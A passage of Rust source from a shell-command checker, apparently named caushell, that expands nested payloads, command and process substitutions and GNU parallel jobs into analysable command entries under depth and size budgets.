        program_command_index(entry),
        program_scope_bindings(entry),
        &entry.history_anchor_node_id,
        max_nested_parse_depth.saturating_sub(entry.depth),
        Some(source_context),
    );
    let mut candidates = if matches!(resolved.normalized_command_name.as_str(), "bash" | "sh") {
        let mut candidates = recursive_payload_candidates_for_scoped_command(
            registry,
            session,
            request,
            &entry.static_payload_scope.parsed_scope,
            entry.static_payload_scope.command_index,
            &resolved.bound,
            &runtime_binding_replay(registry, request, &entry.static_payload_scope.bindings),
            &runtime_binding_replay(
                registry,
                request,
                &entry.static_payload_scope.scope_base_bindings,
            ),
            max_nested_parse_depth.saturating_sub(entry.depth),
        )
        .into_iter()
        .filter(|candidate| {
            matches!(
                candidate.source,
                PayloadSource::Stdin | PayloadSource::ScriptFileRef
            )
        })
        .collect::<Vec<_>>();
        candidates.extend(script_file_candidates);
        candidates
    } else {
        let mut candidates = recursive_payload_candidates_for_scoped_command(
            registry,
            session,
            request,
            &entry.static_payload_scope.parsed_scope,
            entry.static_payload_scope.command_index,
            &resolved.bound,
            &runtime_binding_replay(registry, request, &entry.static_payload_scope.bindings),
            &runtime_binding_replay(
                registry,
                request,
                &entry.static_payload_scope.scope_base_bindings,
            ),
            max_nested_parse_depth.saturating_sub(entry.depth),
        );
        candidates.extend(script_file_candidates);
        candidates
    };

    let mut children = Vec::new();
    for (candidate_index, candidate) in candidates.drain(..).enumerate() {
        let payload_bindings = native_payload_bindings(&candidate, &entry.bindings);
        let mut child_inherited_scope = entry.inherited_scope.clone();
        if matches!(
            candidate.origin,
            RecursivePayloadOrigin::NativeChildShell { .. }
        ) {
            child_inherited_scope.static_input_cwd_unproven = true;
        }
        let materialized = materialize_recursive_payload_candidate(&candidate, &payload_bindings);
        let record_id = NestedPayloadRecordId(first_payload_id + unresolved_payloads.len());
        let parent_ref = NestedPayloadParentRef::DerivedInvocation {
            node_id: entry.source_node_id.clone(),
        };
        if !matches!(
            materialized.resolution,
            ValueMaterialization::Static
                | ValueMaterialization::ResolvedExactScalar { .. }
                | ValueMaterialization::ResolvedRuntimeProduced { .. }
                | ValueMaterialization::ResolvedShellWord { .. }
        ) {
            unresolved_payloads.push(NestedPayloadRecord {
                record_id,
                parent_ref,
                root_command_index: entry.root_command_index,
                depth: entry.depth.saturating_add(1),
                bindings: payload_bindings.clone(),
                resolution: NestedPayloadResolution::from_unresolved_materialization(
                    materialized.resolution.clone(),
                ),
                candidate: materialized,
                execution_cwd: None,
            });
            continue;
        }

        if entry.depth >= max_nested_parse_depth {
            unresolved_payloads.push(NestedPayloadRecord {
                record_id,
                parent_ref,
                root_command_index: entry.root_command_index,
                depth: entry.depth.saturating_add(1),
                bindings: payload_bindings.clone(),
                resolution: NestedPayloadResolution::TruncatedByDepthBudget {
                    max_depth: max_nested_parse_depth,
                    next_candidate_count: 1,
                },
                candidate: materialized,
                execution_cwd: None,
            });
            continue;
        }

        let parse_result = parse_recursive_payload_candidate(&materialized.candidate);
        let caushell_profile::RecursivePayloadParseResult::Parsed(parsed_payload) = parse_result
        else {
            unresolved_payloads.push(NestedPayloadRecord::from_parse_result(
                record_id,
                parent_ref,
                entry.root_command_index,
                entry.depth.saturating_add(1),
                payload_bindings.clone(),
                materialized,
                parse_result,
            ));
            continue;
        };
        let shell_kind = parsed_payload.shell_kind;
        let parsed = parsed_payload.artifact;
        if parsed.commands.is_empty() {
            register_shell_redirection_scope(
                registry,
                request,
                syntax_scopes,
                &parsed,
                &payload_bindings,
                entry.source_node_id.clone(),
                None,
                ExecutionUnitOriginKind::RecursivePayload,
                ExecutionUnitOriginLocator::None,
                entry.depth.saturating_add(1),
                entry.root_command_index,
                false,
                max_nested_parse_depth,
            );
        }

        for (command_index, command) in parsed.commands.iter().enumerate() {
            let command_bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                payload_bindings.clone(),
                &parsed,
                command.span.start_byte,
                request.sequence_no,
            );
            children.push(ExpandedFrontierEntry {
                source_node_id: expanded_virtual_node_id_with_suffix(
                    "recursive-payload",
                    &entry.source_node_id,
                    &format!("{candidate_index}:{command_index}"),
                ),
                command_ref: ParsedCommandRef::new(command_index, command.span.clone()),
                parsed_scope: parsed.clone(),
                rendered_command_text: command.text.clone(),
                result: resolve_invocation_artifact_with_bindings(
                    registry,
                    command,
                    runtime_context_for_parsed_command(&parsed, command_index, command),
                    &command_bindings,
                ),
                shell_kind,
                root_command_index: entry.root_command_index,
                depth: entry.depth.saturating_add(1),
                parent_execution_node_id: entry.source_node_id.clone(),
                bindings: command_bindings.clone(),
                static_payload_scope: StaticPayloadLookupScope {
                    parsed_scope: parsed.clone(),
                    command_index,
                    bindings: command_bindings,
                    scope_base_bindings: payload_bindings.clone(),
                    stdin_is_parent_output: false,
                },
                history_anchor_node_id: entry.history_anchor_node_id.clone(),
                origin_kind: ExecutionUnitOriginKind::RecursivePayload,
                origin_index: command_index,
                origin_locator: ExecutionUnitOriginLocator::None,
                inherited_scope: child_inherited_scope.clone(),
            });
        }
    }

    children
}

fn expanded_command_substitution_body_children(
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    max_nested_parse_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    let Some(command) = entry
        .parsed_scope
        .commands
        .get(entry.command_ref.command_index)
    else {
        return Vec::new();
    };

    let mut children = Vec::new();
    for (token_index, token) in command.tokens.iter().enumerate() {
        if token.runtime_data || token.implicit_input_source.is_some() {
            continue;
        }
        for (substitution_index, substitution) in token.command_substitutions.iter().enumerate() {
            let (parsed_substitution, unknown_index) = execution_body_scope(
                &substitution.body_text,
                entry.shell_kind,
                entry.depth.saturating_add(1) > max_nested_parse_depth,
                "command substitution body",
            );

            if parsed_substitution.commands.is_empty() {
                register_shell_redirection_scope(
                    registry,
                    request,
                    syntax_scopes,
                    &parsed_substitution,
                    &entry.bindings,
                    entry.source_node_id.clone(),
                    None,
                    ExecutionUnitOriginKind::CommandSubstitutionBody,
                    ExecutionUnitOriginLocator::CommandSubstitutionBody {
                        token_index,
                        substitution_index,
                    },
                    entry.depth.saturating_add(1),
                    entry.root_command_index,
                    false,
                    max_nested_parse_depth,
                );
            }
            for (command_index, child_command) in parsed_substitution.commands.iter().enumerate() {
                let command_bindings = apply_runtime_variable_bindings_before_span(
                    registry,
                    request,
                    entry.bindings.clone(),
                    &parsed_substitution,
                    child_command.span.start_byte,
                    request.sequence_no,
                );
                children.push(ExpandedFrontierEntry {
                    source_node_id: expanded_virtual_node_id_with_suffix(
                        "subst-body",
                        &entry.source_node_id,
                        &format!("{token_index}:{substitution_index}:{command_index}"),
                    ),
                    command_ref: ParsedCommandRef::new(command_index, child_command.span.clone()),
                    parsed_scope: parsed_substitution.clone(),
                    rendered_command_text: child_command.text.clone(),
                    result: if unknown_index == Some(command_index) {
                        ResolveInvocationArtifactResult::MissingCommandName {
                            gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                        }
                    } else {
                        resolve_invocation_artifact_with_bindings(
                            registry,
                            child_command,
                            runtime_context_for_parsed_command(
                                &parsed_substitution,
                                command_index,
                                child_command,
                            ),
                            &command_bindings,
                        )
                    },
                    shell_kind: entry.shell_kind,
                    root_command_index: entry.root_command_index,
                    depth: entry.depth.saturating_add(1),
                    parent_execution_node_id: entry.source_node_id.clone(),
                    bindings: command_bindings.clone(),
                    static_payload_scope: StaticPayloadLookupScope {
                        parsed_scope: parsed_substitution.clone(),
                        command_index,
                        bindings: command_bindings,
                        scope_base_bindings: entry.bindings.clone(),
                        stdin_is_parent_output: false,
                    },
                    history_anchor_node_id: entry.history_anchor_node_id.clone(),
                    origin_kind: ExecutionUnitOriginKind::CommandSubstitutionBody,
                    origin_index: command_index,
                    origin_locator: ExecutionUnitOriginLocator::CommandSubstitutionBody {
                        token_index,
                        substitution_index,
                    },
                    inherited_scope: entry.inherited_scope.clone(),
                });
            }

            let scope_record_node_id = parsed_substitution.commands.first().map(|_| {
                expanded_virtual_node_id_with_suffix(
                    "subst-body",
                    &entry.source_node_id,
                    &format!("{token_index}:{substitution_index}:0"),
                )
            });
            children.extend(
                expanded_assignment_command_substitution_body_children_for_scope(
                    syntax_scopes,
                    registry,
                    request,
                    &parsed_substitution,
                    entry.shell_kind,
                    &entry.source_node_id,
                    &entry.history_anchor_node_id,
                    entry.root_command_index,
                    entry.depth.saturating_add(2),
                    &entry.bindings,
                    &entry.inherited_scope,
                    None,
                    Some(&format!("subst-body:{token_index}:{substitution_index}")),
                    scope_record_node_id
                        .as_ref()
                        .map(AssignmentCwdSource::RecordScope)
                        .unwrap_or(AssignmentCwdSource::InvocationEntry),
                    max_nested_parse_depth,
                ),
            );
        }
    }

    children
}

fn expanded_process_substitution_body_children(
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: Option<&caushell_profile::ResolvedInvocationArtifact>,
    max_nested_parse_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    let mut children = Vec::new();

    // Shell expansions happen before native option parsing, including words
    // that the profile ignores, cannot bind, or projects as attached operands.
    if entry.origin_kind != ExecutionUnitOriginKind::StaticXargs
        && let Some(command) = entry
            .parsed_scope
            .commands
            .get(entry.command_ref.command_index)
    {
        for (token_index, token) in command.tokens.iter().enumerate() {
            if token.runtime_data || token.implicit_input_source.is_some() {
                continue; // Expanded argv is data, never fresh shell source.
            }
            // Preserve established parameter locators for standalone process
            // substitutions. Every other original word is admitted from syntax,
            // independently of native binding. Never evaluate decoded strings.
            let covered = resolved.is_some_and(|r| {
                r.bound.bound_parameters.iter().any(|p| {
                    p.values.iter().any(|v| {
                        matches!(v, caushell_profile::BoundValue::Argument {
                    node_kind, span, ..
                } if node_kind == "process_substitution" && span == &token.span)
                    })
                })
            });
            if covered {
                continue;
            }
            let Some(raw_word) = entry
                .parsed_scope
                .raw_command
                .get(token.span.start_byte..token.span.end_byte)
            else {
                continue;
            };
            let Ok(substitutions) =
                caushell_parse::parse_argument_process_substitutions(raw_word, entry.shell_kind)
            else {
                continue;
            };

            for (substitution_index, substitution) in substitutions.iter().enumerate() {
                let (parsed_substitution, unknown_index) = execution_body_scope(
                    &substitution.body_text,
                    entry.shell_kind,
                    entry.depth.saturating_add(1) > max_nested_parse_depth,
                    "process substitution body",
                );

                if parsed_substitution.commands.is_empty() {
                    register_shell_redirection_scope(
                        registry,
                        request,
                        syntax_scopes,
                        &parsed_substitution,
                        &entry.bindings,
                        entry.source_node_id.clone(),
                        None,
                        ExecutionUnitOriginKind::ProcessSubstitutionBody,
                        ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                            location_kind: ProcessSubstitutionLocationKind::ArgumentWord,
                            outer_index: token_index,
                            location_subindex: 0,
                            substitution_index,
                        },
                        entry.depth.saturating_add(1),
                        entry.root_command_index,
                        false,
                        max_nested_parse_depth,
                    );
                }

                for (command_index, child_command) in
                    parsed_substitution.commands.iter().enumerate()
                {
                    let command_bindings = apply_runtime_variable_bindings_before_span(
                        registry,
                        request,
                        entry.bindings.clone(),
                        &parsed_substitution,
                        child_command.span.start_byte,
                        request.sequence_no,
                    );
                    children.push(ExpandedFrontierEntry {
                        source_node_id: expanded_virtual_node_id_with_suffix(
                            "procsub-body",
                            &entry.source_node_id,
                            &format!(
                                "arg-token:{token_index}:0:{substitution_index}:{command_index}"
                            ),
                        ),
                        command_ref: ParsedCommandRef::new(
                            command_index,
                            child_command.span.clone(),
                        ),
                        parsed_scope: parsed_substitution.clone(),
                        rendered_command_text: child_command.text.clone(),
                        result: if unknown_index == Some(command_index) {
                            ResolveInvocationArtifactResult::MissingCommandName {
                                gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                            }
                        } else {
                            resolve_invocation_artifact_with_bindings(
                                registry,
                                child_command,
                                runtime_context_for_process_substitution_command(
                                    &parsed_substitution,
                                    command_index,
                                    child_command,
                                    substitution.operator
                                        == caushell_parse::ProcessSubstitutionOperator::Output,
                                ),
                                &command_bindings,
                            )
                        },
                        shell_kind: entry.shell_kind,
                        root_command_index: entry.root_command_index,
                        depth: entry.depth.saturating_add(1),
                        parent_execution_node_id: entry.source_node_id.clone(),
                        bindings: command_bindings.clone(),
                        static_payload_scope: StaticPayloadLookupScope {
                            parsed_scope: parsed_substitution.clone(),
                            command_index,
                            bindings: command_bindings,
                            scope_base_bindings: entry.bindings.clone(),
                            stdin_is_parent_output: false,
                        },
                        history_anchor_node_id: entry.history_anchor_node_id.clone(),
                        origin_kind: ExecutionUnitOriginKind::ProcessSubstitutionBody,
                        origin_index: command_index,
                        origin_locator: ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                            location_kind: ProcessSubstitutionLocationKind::ArgumentWord,
                            outer_index: token_index,
                            location_subindex: 0,
                            substitution_index,
                        },
                        inherited_scope: entry.inherited_scope.clone(),
                    });
                }

                let scope_record_node_id = parsed_substitution.commands.first().map(|_| {
                    expanded_virtual_node_id_with_suffix(
                        "procsub-body",
                        &entry.source_node_id,
                        &format!("arg-token:{token_index}:0:{substitution_index}:0"),
                    )
                });
                children.extend(
                    expanded_assignment_command_substitution_body_children_for_scope(
                        syntax_scopes,
                        registry,
                        request,
                        &parsed_substitution,
                        entry.shell_kind,
                        &entry.source_node_id,
                        &entry.history_anchor_node_id,
                        entry.root_command_index,
                        entry.depth.saturating_add(2),
                        &entry.bindings,
                        &entry.inherited_scope,
                        None,
                        Some(&format!(
                            "procsub-arg-token:{token_index}:0:{substitution_index}"
                        )),
                        scope_record_node_id
                            .as_ref()
                            .map(AssignmentCwdSource::RecordScope)
                            .unwrap_or(AssignmentCwdSource::InvocationEntry),
                        max_nested_parse_depth,
                    ),
                );
            }
        }
    }

    let Some(resolved) = resolved else {
        return children;
    };
    for (parameter_index, parameter) in resolved.bound.bound_parameters.iter().enumerate() {
        for (value_index, value) in parameter.values.iter().enumerate() {
            let caushell_profile::BoundValue::Argument {
                text, node_kind, ..
            } = value
            else {
                continue;
            };
            if node_kind != "process_substitution" {
                continue;
            }

            let Ok(substitutions) =
                caushell_parse::parse_argument_process_substitutions(text, entry.shell_kind)
            else {
                continue;
            };

            for (substitution_index, substitution) in substitutions.iter().enumerate() {
                let (parsed_substitution, unknown_index) = execution_body_scope(
                    &substitution.body_text,
                    entry.shell_kind,
                    entry.depth.saturating_add(1) > max_nested_parse_depth,
                    "process substitution body",
                );

                if parsed_substitution.commands.is_empty() {
                    register_shell_redirection_scope(
                        registry,
                        request,
                        syntax_scopes,
                        &parsed_substitution,
                        &entry.bindings,
                        entry.source_node_id.clone(),
                        None,
                        ExecutionUnitOriginKind::ProcessSubstitutionBody,
                        ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                            location_kind: ProcessSubstitutionLocationKind::Argument,
                            outer_index: parameter_index,
                            location_subindex: value_index,
                            substitution_index,
                        },
                        entry.depth.saturating_add(1),
                        entry.root_command_index,
                        false,
                        max_nested_parse_depth,
                    );
                }

                for (command_index, child_command) in
                    parsed_substitution.commands.iter().enumerate()
                {
                    let command_bindings = apply_runtime_variable_bindings_before_span(
                        registry,
                        request,
                        entry.bindings.clone(),
                        &parsed_substitution,
                        child_command.span.start_byte,
                        request.sequence_no,
                    );
                    children.push(ExpandedFrontierEntry {
                        source_node_id: expanded_virtual_node_id_with_suffix(
                            "procsub-body",
                            &entry.source_node_id,
                            &format!(
                                "arg:{parameter_index}:{value_index}:{substitution_index}:{command_index}"
                            ),
                        ),
                        command_ref: ParsedCommandRef::new(
                            command_index,
                            child_command.span.clone(),
                        ),
                        parsed_scope: parsed_substitution.clone(),
                        rendered_command_text: child_command.text.clone(),
                        result: if unknown_index == Some(command_index) {
                            ResolveInvocationArtifactResult::MissingCommandName {
                                gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                            }
                        } else { resolve_invocation_artifact_with_bindings(
                            registry,
                            child_command,
                            runtime_context_for_process_substitution_command(
                                &parsed_substitution,
                                command_index,
                                child_command,
                                substitution.operator
                                    == caushell_parse::ProcessSubstitutionOperator::Output,
                            ),
                            &command_bindings,
                        ) },
                        shell_kind: entry.shell_kind,
                        root_command_index: entry.root_command_index,
                        depth: entry.depth.saturating_add(1),
                        parent_execution_node_id: entry.source_node_id.clone(),
                        bindings: command_bindings.clone(),
                        static_payload_scope: StaticPayloadLookupScope {
                            parsed_scope: parsed_substitution.clone(),
                            command_index,
                            bindings: command_bindings,
                            scope_base_bindings: entry.bindings.clone(),
                            stdin_is_parent_output: false,
                        },
                        history_anchor_node_id: entry.history_anchor_node_id.clone(),
                        origin_kind: ExecutionUnitOriginKind::ProcessSubstitutionBody,
                        origin_index: command_index,
                        origin_locator: ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                            location_kind: ProcessSubstitutionLocationKind::Argument,
                            outer_index: parameter_index,
                            location_subindex: value_index,
                            substitution_index,
                        },
                        inherited_scope: entry.inherited_scope.clone(),
                    });
                }

                let scope_record_node_id = parsed_substitution.commands.first().map(|_| {
                    expanded_virtual_node_id_with_suffix(
                        "procsub-body",
                        &entry.source_node_id,
                        &format!("arg:{parameter_index}:{value_index}:{substitution_index}:0"),
                    )
                });
                children.extend(
                    expanded_assignment_command_substitution_body_children_for_scope(
                        syntax_scopes,
                        registry,
                        request,
                        &parsed_substitution,
                        entry.shell_kind,
                        &entry.source_node_id,
                        &entry.history_anchor_node_id,
                        entry.root_command_index,
                        entry.depth.saturating_add(2),
                        &entry.bindings,
                        &entry.inherited_scope,
                        None,
                        Some(&format!(
                            "procsub-arg:{parameter_index}:{value_index}:{substitution_index}"
                        )),
                        scope_record_node_id
                            .as_ref()
                            .map(AssignmentCwdSource::RecordScope)
                            .unwrap_or(AssignmentCwdSource::InvocationEntry),
                        max_nested_parse_depth,
                    ),
                );
            }
        }
    }

    for (redirection_index, redirection) in entry.parsed_scope.redirections.iter().enumerate() {
        if redirection_parent_command_index(&entry.parsed_scope, redirection)
            != Some(entry.command_ref.command_index)
        {
            continue;
        }

        let Some(target) = redirection.target.as_ref() else {
            continue;
        };
        if target.node_kind != "process_substitution" {
            continue;
        }

        let Ok(substitutions) =
            caushell_parse::parse_argument_process_substitutions(&target.text, entry.shell_kind)
        else {
            continue;
        };

        for (substitution_index, substitution) in substitutions.iter().enumerate() {
            let (parsed_substitution, unknown_index) = execution_body_scope(
                &substitution.body_text,
                entry.shell_kind,
                entry.depth.saturating_add(1) > max_nested_parse_depth,
                "process substitution body",
            );
            if parsed_substitution.commands.is_empty() {
                register_shell_redirection_scope(
                    registry,
                    request,
                    syntax_scopes,
                    &parsed_substitution,
                    &entry.bindings,
                    entry.source_node_id.clone(),
                    None,
                    ExecutionUnitOriginKind::ProcessSubstitutionBody,
                    ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                        location_kind: ProcessSubstitutionLocationKind::Redirection,
                        outer_index: redirection_index,
                        location_subindex: 0,
                        substitution_index,
                    },
                    entry.depth.saturating_add(1),
                    entry.root_command_index,
                    false,
                    max_nested_parse_depth,
                );
            }

            for (command_index, child_command) in parsed_substitution.commands.iter().enumerate() {
                let command_bindings = apply_runtime_variable_bindings_before_span(
                    registry,
                    request,
                    entry.bindings.clone(),
                    &parsed_substitution,
                    child_command.span.start_byte,
                    request.sequence_no,
                );
                children.push(ExpandedFrontierEntry {
                    source_node_id: expanded_virtual_node_id_with_suffix(
                        "procsub-body",
                        &entry.source_node_id,
                        &format!("redir:{redirection_index}:{substitution_index}:{command_index}"),
                    ),
                    command_ref: ParsedCommandRef::new(command_index, child_command.span.clone()),
                    parsed_scope: parsed_substitution.clone(),
                    rendered_command_text: child_command.text.clone(),
                    result: if unknown_index == Some(command_index) {
                        ResolveInvocationArtifactResult::MissingCommandName {
                            gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                        }
                    } else {
                        resolve_invocation_artifact_with_bindings(
                            registry,
                            child_command,
                            runtime_context_for_process_substitution_command(
                                &parsed_substitution,
                                command_index,
                                child_command,
                                substitution.operator
                                    == caushell_parse::ProcessSubstitutionOperator::Output,
                            ),
                            &command_bindings,
                        )
                    },
                    shell_kind: entry.shell_kind,
                    root_command_index: entry.root_command_index,
                    depth: entry.depth.saturating_add(1),
                    parent_execution_node_id: entry.source_node_id.clone(),
                    bindings: command_bindings.clone(),
                    static_payload_scope: StaticPayloadLookupScope {
                        parsed_scope: parsed_substitution.clone(),
                        command_index,
                        bindings: command_bindings,
                        scope_base_bindings: entry.bindings.clone(),
                        stdin_is_parent_output: false,
                    },
                    history_anchor_node_id: entry.history_anchor_node_id.clone(),
                    origin_kind: ExecutionUnitOriginKind::ProcessSubstitutionBody,
                    origin_index: command_index,
                    origin_locator: ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                        location_kind: ProcessSubstitutionLocationKind::Redirection,
                        outer_index: redirection_index,
                        location_subindex: 0,
                        substitution_index,
                    },
                    inherited_scope: entry.inherited_scope.clone(),
                });
            }

            let scope_record_node_id = parsed_substitution.commands.first().map(|_| {
                expanded_virtual_node_id_with_suffix(
                    "procsub-body",
                    &entry.source_node_id,
                    &format!("redir:{redirection_index}:{substitution_index}:0"),
                )
            });
            children.extend(
                expanded_assignment_command_substitution_body_children_for_scope(
                    syntax_scopes,
                    registry,
                    request,
                    &parsed_substitution,
                    entry.shell_kind,
                    &entry.source_node_id,
                    &entry.history_anchor_node_id,
                    entry.root_command_index,
                    entry.depth.saturating_add(2),
                    &entry.bindings,
                    &entry.inherited_scope,
                    None,
                    Some(&format!(
                        "procsub-redir:{redirection_index}:{substitution_index}"
                    )),
                    scope_record_node_id
                        .as_ref()
                        .map(AssignmentCwdSource::RecordScope)
                        .unwrap_or(AssignmentCwdSource::InvocationEntry),
                    max_nested_parse_depth,
                ),
            );
        }
    }

    children
}

fn exact_bound_slot_values(
    bound: &caushell_profile::BoundInvocation,
    slot: &str,
) -> Option<Vec<String>> {
    let Some(parameter) = bound
        .bound_parameters
        .iter()
        .find(|p| p.name.as_str() == slot)
    else {
        return Some(Vec::new());
    };
    parameter
        .semantic_values()
        .map(|value| {
            let resolution = match value {
                caushell_profile::SemanticValueRef::Original(
                    caushell_profile::BoundValue::Argument {
                        text,
                        quoted,
                        node_kind,
                        materialization,
                        ..
                    },
                ) => {
                    let value = if matches!(
                        materialization,
                        caushell_profile::BoundArgumentMaterialization::Literal
                    ) {
                        caushell_profile::shell_word_structure(text, *quoted, node_kind)
                            .exact_value()?
                            .to_owned()
                    } else {
                        text.clone()
                    };
                    caushell_profile::SemanticValueResolution::Known(value)
                }
                caushell_profile::SemanticValueRef::Original(_) => return None,
                caushell_profile::SemanticValueRef::Projected { value, .. } => {
                    value.resolution.clone()
                }
            };
            match resolution {
                caushell_profile::SemanticValueResolution::Known(value) => Some(value),
                _ => None,
            }
        })
        .collect()
}

fn dispatch_argument_scalar(argument: &caushell_profile::DispatchArgument) -> Option<String> {
    if argument.implicit_input_source.is_some() {
        return None;
    }
    let projected = caushell_profile::ProjectedArg {
        word_context: Default::default(),
        text: argument.text.clone(),
        quoted: argument.quoted,
        node_kind: argument.node_kind.clone(),
        span: argument.span.clone(),
        implicit_input_source: None,
        runtime_argument_domain: None,
        runtime_data: argument.runtime_data,
        substitution_shape: None,
        native_region_field: None,
        lexical_field_prefix: None,
        kind: caushell_profile::ProjectedArgKind::Positional,
    };
    caushell_profile::argument_structure(&projected)
        .exact_value()
        .map(str::to_owned)
}

fn parallel_template_slot(bound: &caushell_profile::BoundInvocation) -> Option<&str> {
    bound
        .effects
        .iter()
        .find_map(|effect| match &effect.target {
            EffectTarget::Dispatch(target) if effect.kind == EffectKind::DispatchCommand => {
                match &target.command {
                    caushell_profile::DispatchCommandSource::CommandString {
                        slot,
                        syntax: caushell_profile::DispatchStringSyntax::GnuParallel,
                        ..
                    } => Some(slot.as_str()),
                    _ => None,
                }
            }
            _ => None,
        })
}

// This uses the same shell-body parser and frontier admission gate as sh -c.
// It is invoked only by an explicit Profile grammar, not by an argv scan.
#[allow(clippy::too_many_arguments)]
fn native_shell_job_children(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    prefix: &str,
    job_index: usize,
    source: &str,
    opaque: bool,
    max_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    native_shell_job_children_with_inputs(
        registry,
        request,
        entry,
        prefix,
        job_index,
        source,
        opaque,
        max_depth,
        &[],
    )
}

#[allow(clippy::too_many_arguments)]
fn native_shell_job_children_with_inputs(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    prefix: &str,
    job_index: usize,
    source: &str,
    opaque: bool,
    max_depth: u8,
    inputs: &[crate::support::parallel_jobs::SymbolicInput],
) -> Vec<ExpandedFrontierEntry> {
    // Parallel actually executes a generated shell -c invocation. Route that
    // child through the existing interpreter machinery, including assignment
    // substitutions, cwd replay, positional/environment frames and budgets.
    let opaque = opaque
        || !matches!(
            entry.shell_kind,
            caushell_types::ShellKind::Bash | caushell_types::ShellKind::Sh
        );
    let invocation = if opaque {
        source.to_owned()
    } else {
        let shell = match entry.shell_kind {
            caushell_types::ShellKind::Bash => "/bin/bash",
            caushell_types::ShellKind::Sh => "/bin/sh",
            _ => unreachable!("unsupported native shell is opaque"),
        };
        let mut invocation = format!(
            "{shell} -c {}",
            crate::support::parallel_jobs::quote(source)
        );
        if !inputs.is_empty() {
            invocation.push_str(" caushell-native-job");
            for _ in inputs {
                invocation.push_str(" \"$__caushell_native_input\"");
            }
        }
        invocation
    };
    let (mut parsed, unknown_index) = execution_body_scope(
        &invocation,
        entry.shell_kind,
        opaque || entry.depth.saturating_add(1) > max_depth,
        "native shell job",
    );
    if !inputs.is_empty() && unknown_index.is_none() {
        let command = &mut parsed.commands[0];
        let first_input = command.tokens.len() - inputs.len();
        for (token, input) in command.tokens[first_input..].iter_mut().zip(inputs) {
            token.text.clear();
            token.implicit_input_source = Some(caushell_types::ImplicitInputSource::StdinData);
            token.runtime_argument_domain = Some(input.domain.clone());
            token.runtime_data = false;
            token.node_kind = if input.batch {
                "runtime_argument_list"
            } else {
                "runtime_scalar"
            }
            .into();
            token.command_substitutions.clear();
        }
    }
    if opaque {
        for diagnostic in &mut parsed.diagnostics {
            if diagnostic.node_kind == "execution_body" {
                diagnostic.text = format!("native shell job unresolved: {source}");
            }
        }
    }
    let parent = crate::support::command_environment_bindings(
        &entry.bindings,
        &entry.parsed_scope,
        &entry.command_ref,
    );
    let bindings = parent;
    let parent_id = expanded_virtual_node_id(prefix, &entry.source_node_id, job_index);
    parsed
        .commands
        .iter()
        .enumerate()
        .map(|(index, command)| {
            let command_bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                bindings.clone(),
                &parsed,
                command.span.start_byte,
                request.sequence_no,
            );
            ExpandedFrontierEntry {
                source_node_id: expanded_virtual_node_id("native-shell", &parent_id, index),
                command_ref: ParsedCommandRef::new(index, command.span.clone()),
                parsed_scope: parsed.clone(),
                rendered_command_text: command.text.clone(),
                result: if unknown_index == Some(index) {
                    ResolveInvocationArtifactResult::MissingCommandName {
                        gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                    }
                } else {
                    resolve_invocation_artifact_with_bindings(
                        registry,
                        command,
                        runtime_context_for_parsed_command(&parsed, index, command),
                        &command_bindings,
                    )
                },
                shell_kind: entry.shell_kind,
                root_command_index: entry.root_command_index,
                depth: entry.depth.saturating_add(1),
                parent_execution_node_id: entry.source_node_id.clone(),
                bindings: command_bindings.clone(),
                static_payload_scope: StaticPayloadLookupScope {
                    parsed_scope: parsed.clone(),
                    command_index: index,
                    bindings: command_bindings,
                    scope_base_bindings: bindings.clone(),
                    stdin_is_parent_output: false,
                },
                history_anchor_node_id: entry.history_anchor_node_id.clone(),
                origin_kind: ExecutionUnitOriginKind::Dispatch,
                origin_index: index,
                origin_locator: ExecutionUnitOriginLocator::None,
                inherited_scope: entry.inherited_scope.clone(),
            }
        })
        .collect()
}

fn expanded_native_parallel_children(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    max_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    let Some(slot) = parallel_template_slot(&resolved.bound) else {
        return Vec::new();
    };
    let opaque = |reason: &str| {
        native_shell_job_children(
            registry, request, entry, "parallel", 0, reason, true, max_depth,
        )
    };
    let Some(mut words) = exact_bound_slot_values(&resolved.bound, slot) else {
        return opaque("dynamic native job template or source");
    };
    if words.iter().any(|w| w.contains('\0'))
        || words.iter().map(String::len).sum::<usize>() > 64 * 1024
    {
        return opaque("native template size budget exceeded");
    }
    let parent = crate::support::command_environment_bindings(
        &entry.bindings,
        &entry.parsed_scope,
        &entry.command_ref,
    );
    // Known overrides cannot silently be analyzed using the caller shell or
    // default options. No reading host config files or probing parent processes.
    for name in ["PARALLEL", "PARALLEL_SHELL"] {
        if let caushell_profile::EnvironmentValueRef::Present(value) =
            parent.environment_value(name)
        {
            if !matches!(value, SessionValue::ExactScalar(value) if value.is_empty()) {
                return opaque("native job environment override is unresolved");
            }
        }
    }
    let delimiter = if has_applied_modifier(&resolved.bound, "null_delimited") {
        '\0'
    } else {
        '\n'
    };
    let separator = words.iter().position(|w| w == ":::" || w == "::::");
    let mut direct_items = None;
    let evidence = if let Some(position) = separator {
        if has_applied_modifier(&resolved.bound, "arg_file") {
            return opaque("multiple native job sources");
        }
        let source = words.split_off(position);
        if source[1..]
            .iter()
            .any(|w| matches!(w.as_str(), ":::" | "::::" | ":::+" | "::::+"))
        {
            return opaque("multiple native job sources");
        }
        if source[0] == ":::" {
